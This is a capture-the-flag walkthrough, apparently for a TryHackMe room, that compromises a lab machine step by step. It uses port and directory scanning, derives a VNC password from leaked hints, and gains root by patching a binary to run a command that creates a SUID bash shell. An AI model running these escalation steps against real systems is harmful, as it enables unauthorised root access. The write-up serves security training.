# [DX1: Liberty Island](https://tryhackme.com/room/dx1libertyislandplde)

## Can you help the NSF get a foothold in UNATCO's system?

# Compromise the UNATCO server

## The NSF are about to raid Liberty Island to capture the shipment of Ambrosia from UNATCO (The United Nations Anti-Terrorist Coalition). As our top hacker, we need you to gain a root foothold on the UNATCO admin network.

### What is the User flag?

1. Start with a full port scan to discover all open services on the target machine.

```bash
nmap -p- <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
5901/tcp  open  vnc-1
23023/tcp open  unknown
```

2. Enumerate the web server's directories and files to find hidden content.

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html -t 50
```

**Results:**

```
/index.html           (Status: 200) [Size: 909]
/terrorism.html       (Status: 200) [Size: 5939]
/robots.txt           (Status: 200) [Size: 95]
/threats.html         (Status: 200) [Size: 4140]
/server-status        (Status: 403) [Size: 278]
```

3. Check `http://<TARGET_IP>/robots.txt`. Comment in the file leaks a hidden path that the web admin tried to obscure:

```
# Disallow: /datacubes # why just block this? no corp should crawl our stuff - alex
Disallow: *
```

4. `http://<TARGET_IP>/datacubes/0000/` loads a landing page for an internal archive:

```
Liberty Island Datapads Archive
All credentials within *should* be [redacted] - alert the administrators immediately if any are found that are 'clear text'
Access granted to personnel with clearance of Domination/5F or higher only.
```

> The archive uses 4-digit zero-padded numeric IDs. We need to brute-force the possible datacube numbers to find which IDs actually exist.

5. Generate a zero-padded 4-digit wordlist covering all possible datacube IDs:

```bash
seq -w 0 9999 > num.txt
```

6. Run gobuster against the `/datacubes` endpoint using the generated wordlist:

```bash
gobuster dir -u http://<TARGET_IP>/datacubes -w num.txt -t 50
```

**Results:**

```
/0000                 (Status: 301) [Size: 323] [--> http://<TARGET_IP>/datacubes/0000/]
/0011                 (Status: 301) [Size: 323] [--> http://<TARGET_IP>/datacubes/0011/]
/0068                 (Status: 301) [Size: 323] [--> http://<TARGET_IP>/datacubes/0068/]
/0103                 (Status: 301) [Size: 323] [--> http://<TARGET_IP>/datacubes/0103/]
/0233                 (Status: 301) [Size: 323] [--> http://<TARGET_IP>/datacubes/0233/]
/0451                 (Status: 301) [Size: 323] [--> http://<TARGET_IP>/datacubes/0451/]
```

> Browse through the datacubes. The most interesting one is `/0451`.

7. `http://<TARGET_IP>/datacubes/0451/` contains a message with VNC credential instructions:

```
Brother,

I've set up VNC on this machine under jacobson's account. We don't know his loyalty, but should assume hostile.
Problem is he's good - no doubt he'll find it... a hasty defense, but since we won't be here long, it should work.

The VNC login is the following message, 'smashthestate', hmac'ed with my username from the 'bad actors' list (lol).
Use md5 for the hmac hashing algo. The first 8 characters of the final hash is the VNC password. - JL
```

8. `http://<TARGET_IP>/badactors.html` lists all known bad actors:

```
apriest
aquinas_nz
cookiecat
craks
curley
darkmattermatt
etodd
gfoyle
grank
gsyme
haz
hgrimaldi
hhall
hquinnzell
infosneknz
jallred
jhearst
jlebedev
jooleeah
juannsf
killer_andrew
lachland
leesh
levelbeam
mattypattatty
memn0ps
nhas
notsus
oenzian
roseycross
sjasperson
sweetcharity
tfrase
thom_seven
ttong
```

> The only username with initials **JL** is `jlebedev`. This is the HMAC secret key.

9. Compute the HMAC-MD5 of the string `smashthestate` using `jlebedev` as the secret key. Use `https://www.freeformatter.com/hmac-generator.html`:
   - string: `smashthestate`
   - Secret key: `jlebedev`
   - Digest algorithm: `MD5`

10. Connect to the VNC server using the password:

```bash
vncviewer <TARGET_IP>:5901
```

10. The first flag is on the desktop in the `user.txt` file.

<img width="645" height="347" alt="SCREEN01" src="https://github.com/user-attachments/assets/2cf67037-1ec4-462b-a631-f11ec758b004" />

---

### What is the Root flag?

1. While in the VNC session, locate the badactors-list binary on the desktop:

```bash
strings badactors-list > strings
```

2. Inspect the `strings` output. Among the readable strings, you'll find an embedded shell command that the binary executes:

```
base64 -d > /var/www/html/badactors.txt
```

<img width="646" height="474" alt="SCREEN02" src="https://github.com/user-attachments/assets/d9fae488-76be-4029-a3b6-8ac70f80226a" />

> This tells us the binary decodes a base64-encoded payload and writes it to the bad actors list file. Importantly, this command is likely executed with elevated privileges, which we can abuse.

3. Craft a payload that, when swapped in place of the original command, will `copy` bash to `/tmp/a` and set the SUID bit giving us a root shell. The replacement **must be the exact same byte length** as the original command for a clean binary patch. Run the following Python script:

```python
with open('badactors-list', 'rb') as f:
    data = f.read()

old = b'base64 -d > /var/www/html/badactors.txt'
new = b'cp /bin/bash /tmp/a  && chmod +s /tmp/a'

assert len(old) == len(new)

with open('badactors-list', 'wb') as f:
    f.write(data.replace(old, new))
```

4. Open the `badactors-list` application and click **Update List**. This executes the patched binary as root, which copies `bash` to `/tmp/a` and sets its SUID bit.

5. Execute the SUID bash shell with the `-p` flag to preserve the elevated privileges, then read the root flag:

```bash
cd /tmp
./a -p
cd /root
cat root.txt
```

<img width="662" height="457" alt="SCREEN03" src="https://github.com/user-attachments/assets/17819f8b-c253-4884-b486-75b522250623" />
